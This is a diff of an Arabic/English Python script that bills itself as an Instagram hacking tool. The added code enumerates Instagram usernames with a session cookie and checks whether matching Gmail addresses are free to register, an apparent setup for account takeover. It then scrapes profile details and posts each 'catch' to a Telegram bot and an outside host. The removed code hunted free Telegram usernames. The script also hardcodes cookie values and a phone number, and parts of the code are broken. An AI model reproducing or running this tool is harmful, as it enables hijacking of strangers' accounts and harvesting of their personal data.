@@ -1,153 +1,199 @@
-from datetime import *
-
-def dan(y=0,m=0,d=0):
- date = datetime.now()
- if len(list(str(y))) == 4:
-  if m <= 12 and m > 0:
-   if d <= 31 and d > 0:
-    if date.year <= y:
-     if date.month <= m:
-      if date.day < d:
-       return True
-x = dan(2025,9,25)
-     
-if x:pass
-else:quit(' تم ايقاف الاداه اذهب للجلاد حاكم الهكسوس ليقوم بتشغيلها!!!')
-print(" The tools is working go to osamh now if you need update this tools")
-import webbrowser
-import os
-
-#@PY_A0
-
-os.system('pip install webbrowser')
-import os
-os.system('pip install os')
-
-
-print(' \n        WELCOME TO OSAMH TOOLS ')
-
-
-webbrowser.open('https://t.me/HACKEEM_AL_HACKSOOS')
-
-#كسمك اذا فتحت التشفير عوافي
-
-
-
-
+import requests
+import gdolib
 import random
-import time, requests, webbrowser
-from time import sleep
-import os
-import sys
-import pyfiglet
-from pyfiglet import figlet_format
-A = "\033[1;91m"
-B = "\033[1;90m"
-C = "\033[1;97m"
-E = "\033[1;92m"
-H = "\033[1;93m"
-K = "\033[1;94m"
-L = "\033[1;95m"
+import json
+import requests,os,names,json,random
+import requests,os,names,random,time,webbrowser
+from user_agent import generate_user_agent
+from uuid import uuid4
+uid = uuid4()
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+import requests,sys,os,time
 
-from rich.panel import Panel as Ch
-from rich import print as code
-code(Ch('                         THE KING OF HACKSOSS )) 
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+r = requests.session()
+os.system( 'clear' )
+G = '\033[2;32m'
+R = '\033[2;31m'
+Y = "\033[2;34m"
+W = "\033[2;35m"
+D = "\033[2;36m"
+M = "\033[2;33m"
 
-import os
-s = '\033[1;36m'
-a = '\033[1;33m'
-z = '\033[1;31m'
+pss=input(R+"Enter the password !؟. ")
+if pss ==  'hacksoss' : 
+ pass
+ print(G+"login successfully in tools the king of hacksoss")
+ time.sleep(1)
+ os.system(  ' clear'   )
+else:
+ exit(  " The password is wrong❌"   )
+print("""
 
-try:
- from cfonts import render, say
-except:
- os.system('pip install python-cfonts')
-din = render(f'osamh', colors=['red', 'yellow'], align='center')
-print(din)
-print(s+'*'*60)
+"""+G+""" < """+G+"""  THE KING OF HACKSOSS 
+ OSAMH """+G+""" >
 
-logo1 = figlet_format('KY_112',font ='banner3')
-print(H+logo1)
-print(E+'- '*25)
-token = input(H+'- Enter the token bot :  ')
-ID = input(K+'-Enter the ID :  ')
-os.system('clear')
-logo2 = figlet_format('osamh',font ='banner3')
-print(logo2)
-print(H+'∞'*30)
-print("[1] USER #_#_#\n\n[2] USER ##_##\n\n[3] USER ###BOT ")
-print(H+'∞'*30)
-H_P_O= input('Enter the number if you need hack users:  ')
-print(H+'∞'*30)
-def sh3():
-	os.system('clear')
-	logo1 = figlet_format('osamh #_#_#',font ='banner3-D')
-	print(logo1)
-	print(H+'_'*60)
+  """+G+"""___ ____   _   _ _   _ _   _ _____ 
+"""+G+""" |_ _/  \
+"""+G+"""  | | |   | 
+"""+G+"""  | R
+"""+G+""" 
+    """+G+"""<    """+R+"""TOOLS OSAMH IN INSTGRAM HACK  lTHE FIRST TOOLS"""+G+""">                              
+                                        
+"""+G+"""▷ """+G+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+G+"""◁
+"""+R+""" ⁂  THE KING OSAMH  @KY_112  """+G+""" ¦ """+G+"""     
+"""+G+""" ⁂  Whatsapp """+G+""" ¦ """+G+""" +967730189500
+"""+G+""" ⁂ Telegram """+G+""" ¦@KY_112 """+G+""" 
+"""+G+"""▷ """+G+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+G+"""◁                                         
+""")
+
+print(R+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
+
+	
+print(G+"""This tool was developed by the programmer : Osamh to hack Instagram accounts  """)
+print(R+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
+hit = 0
+	 
+#############################
+token = input(G+"➠ Enter the Token " )
+
+ID = input(G+"   ➠Enter the ID  " )
+
+sessionid = input(' ➠Enter the session ')
+
+header={'Cookie':'mid=Yuoj_QABAAGDy60NqxnFkEK1ugGo; ig_did=73D09A01-5DEF-4825-A5FC-297629366704; ig_nrcb=1; dpr=1.75; datr=HyTqYpFIZCgFZLABtNmwFg7j; ds_user_id=54376972287; shbid="3201\05454376972287\0541691331769:01f7ecaf474c01cf2b64f89f656976d0965c8da3073154330a4900add3c619f67e943202"; shbts="1659795769\05454376972287\0541691331769:01f70263e8842a11c12dee03be01e020f555ebaa18ecb741a217c2cc23830cc4991498f9"; csrftoken=yGVOWF0iptpC69PXXdisZrltMc5Fzv5W; sessionid='+sessionid}
+ID = input(D+" ➠Enter the ID agin" )
+Token = input(D+" ➠Enter the tokin agin " )
+print(G+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
+print("""
+   """+G+"""/ @K_Y_1_1_2                      /$$          
+"""+G+""" /$$__  $$        @KY_112            | $$          
+"""+R+"""| Wait a few moments, the tool will start """)
+print(G+""" ➸➸➸➸➸➸➸➸➸➸★𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐒𝐀𝐌𝐇★➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸➸""")
+#https://t.me/HACKEEM_AL_HACKSOOS
+def dead(email,user):
+              global hit           
+              url = 'https://android.clients.google.com/setup/checkavail'
+              hed = {
+	    'Content-Length':'98',
+	    	
+	    'Content-Type':'text/plain; charset=UTF-8',
+	    'Host':'android.clients.google.com',
+	    	
+	    'Connection':'Keep-Alive',
+	    	
+	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
+              data = json.dumps({
+	'username':email,
+	'version':'3',
+	'firstName':'123456',
+	'lastName':'deadcode_22'})
+	
+              res = requests.post(url,data=data,headers=hed)
+              if res.json()['status'] == 'SUCCESS':
+              	
+                      check = gdolib.check_email.instagram(email)
+                      if check['status']=='Success':
+                          print(G+f' ✅ تم صيد حساب انستا بواسطه القياده 112حاكم الهكسوس: {email} 🛡 ')
+                          hit += 1
+                          user = email.split('@')[0]
+                          try:
+                          	
+                           rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=header).json()  
+                           	
+                           nam = str(rr['graphql']['user']['full_name'])
+                           iddd = str(rr['graphql']['user']['id'])
+                           fol = str(rr['graphql']['user']['edge_followed_by']['count'])
+                           fols =str(rr['graphql']['user']['edge_follow']['count'])
+                           isp = str(rr['graphql']['user']['is_private'])
+                           bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
+           	
+                           re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
+                           ree = re.json()
+                           dat = ree['data']
+                           tlg =(f"""
+‌‌‌تم صيد حساب انستا بواسطه القياده112حاكم الهكسوس
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+متاح من الحاكم⇦ {hit}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+الاسم⇦ {nam}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+اليوزر ⇦ {user}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+الايميل⇦ {email}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+متابعيين ⇦ {fol}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+يتابع⇦ {fols}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+تاريخ صيد الحاكم⇦ {dat}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+منشوارته⇦ {bio}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+لينك الحساب⇦ https://www.instagram.com/{user}
+➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+تم بواسطه   ➪ https://t.me HACKEEM_AL_HACKSOOS""")
+                           print(tlg)
+                           	
+                           		
+                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+                          except:
+                           tlg=(f"""
+‌‌‌   ★ تم صيد متاح انستا☑★
+              الجلاد112 حاكم الهكسوس مر من هنا ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+رقم الصيد ⇦ {hit}
+               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+اليوزر ⇦ {user}
+               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+الايميل ⇦ {email}
+               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+لينك الحساب  ⇦ https://www.instagram.com/{user}
+               ➸➸➸➸𝐎𝐒𝐀𝐌𝐇➸➸➸➸
+        
+      𝐁𝐘 ➪ @KY_112         
+               
+ مصدر وقناه الحاكم ☜  https://t.me/V00_8 """)
+                           requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+                           print(tlg)
+                      else:
+                          print(R+f' No insta: {email} 🚫  ')
+              elif res.json()['status'] =='USERNAME_UNAVAILABLE':
+                  print(R+f' ❌ wrong email : {email} ')
+              else:
+                  print(f"{R} The tool has been stopped, go to Osamh (@KY_112) the developer to restart it")
+                  exit()   
+def rand():
 	while True:
-		oip1 ='QWERTYUIOPLKMNJHBVGFCXDSZA'
-		all1 = 'QAZXSWEDCVFRTGBNHYUJMKIOLP1234567890'
-		u1 = str(''.join(random.choice(oip1)for i in range(1)))
-		u2 = str(''.join(random.choice(all1)for i in range(1)))
-		u3 = str(''.join(random.choice(all1)for i in range(1)))
-		tr = '_'
-		user11 = u1+tr+u2+tr+u3
-		url = f"https://t.me/{user11}"
-		req = requests.get(url)
-		if req.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"')>=0: 
-			print(f" \033[1;32m - work >> [ {user11} ]")
-			req = requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=- سجل دخول الجلاد حاكم الهكسوس شخصيا
-𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐇𝐀𝐂𝐊𝐒𝐎𝐒𝐒 .\n. — —— — —  — — — — — .\n- اليوزر يافخمي :  @{user11} \n 
-by : @KY_112:يوزر المطور الجلاد -  @HACKEEM_AL_HACKSOOS :رابط قناه الجلاد ''')
+		user='1234567890qwertyuiopasdfghjklzxcvbnm.'
+		num='456789'
+		rng=int("".join(random.choice(num)for i in range(1)))
+		name=str("".join(random.choice(user)for i in range(rng)))
+		ch=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
+		if "users" in ch.text:
+			
+			for i in ch.json()["users"]:
+				
+				user=(i['user']['username'])
+				em = user
+					
+				email = em+"@gmail.com"
+				dead(email,user)
 		else:
-			print(f"\033[1;31m - Not Work >> [ {user11} ]")
-def sh4():
-	os.system('clear')
-	logo1 = figlet_format('osamh ##_##',font ='banner3-D')
-	print(logo1)
-	print(H+'_'*60)
-	while True:
-		oip2 ='QWERTYUIOPLKMNJHBVGFCXDSZA'
-		all2 = 'QAZXSWEDCVFRTGBNHYUJMKIOLP1234567890'
-		u1 = str(''.join(random.choice(oip2)for i in range(1)))
-		u2 = str(''.join(random.choice(all2)for i in range(1)))
-		u3 = str(''.join(random.choice(all2)for i in range(1)))
-		u4 = str(''.join(random.choice(all2)for i in range(1)))
-		tr ='_'
-		user22 = u1+u2+tr+u3+u4
-		url = f"https://t.me/{user22}"
-		req = requests.get(url)
-		if req.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"')>=0: 
-			print(f" \033[1;32m - work >> [ {user22} ]")
-			req = requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=- سجل دخول الجلاد حاكم الهكسوس شخصيا 
-𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐇𝐀𝐂𝐊𝐒𝐎𝐒𝐒 .\n. — —— — —  — — — — — .\n- اليوزر يافخمي :  @{user22} \n 
-by : @KY_112:يوزر المطور الجلاد -  @HACKEEM_AL_HACKSOOS :رابط قناه الجلاد ''')
-		else:
-			  print(f"\033[1;31m - Not Work >> [ {user22} ]")
-def bot3():
-	os.system('clear')
-	logo1 = figlet_format('osamh ###BOT',font ='banner3-D')
-	print(logo1)
-	print(H+'_'*60)
-	while True:
-		oip3='QWERTYUIOPLKMNJHBVGFCXDSZA'
-		all3 = 'QAZXSWEDCVFRTGBNHYUJMKIOLP1234567890'
-		u1 = str(''.join(random.choice(oip3)for i in range(1)))
-		u2 = str(''.join(random.choice(all3)for i in range(1)))
-		u3 = str(''.join(random.choice(all3)for i in range(1)))
-		user33 = u1+u2+u3+'BOT'
-		url = f"https://t.me/{user33}"
-		req = requests.get(url)
-		if req.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"')>=0: 
-			print(f" \033[1;32m - work >> [ {user33} ]")
-			req = requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=- سجل دخول الجلاد حاكم الهكسوس شخصيا
-𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐇𝐀𝐂𝐊𝐒𝐎𝐒𝐒 .\n. — —— — —  — — — — — .\n- اليوزر يافخمي :  @{user33} \n 
-by : @KY_112:يوزر المطور الجلاد -  @HACKEEM_AL_HACKSOOS :رابط قناه الجلاد ''')
-		else:
-			  print(f"\033[1;31m - Not Work >> [ {user33} ]")
-if H_P_O=='1':
-	sh3()
-if H_P_O=='2':
-	sh4()
-if H_P_O=='3':
-	bot3()
+			
+					rand()
+	
+rand()      
+#import time
+#myTime = time.ctime()
+#print (my time)
+# 
+#	mytime2 = time.asctime()
+#mytime = time.localtime()
+#resultTime = time.strftime("%d/%n/%Y, %H:%M:%S" , mytime )
+#beforeSleep = "This is the frist sentence"
+#print(beforeSleep)
+#time.sleep(8)
+#afterSleep = "This is the secound statement"
+#print(afterSleep)
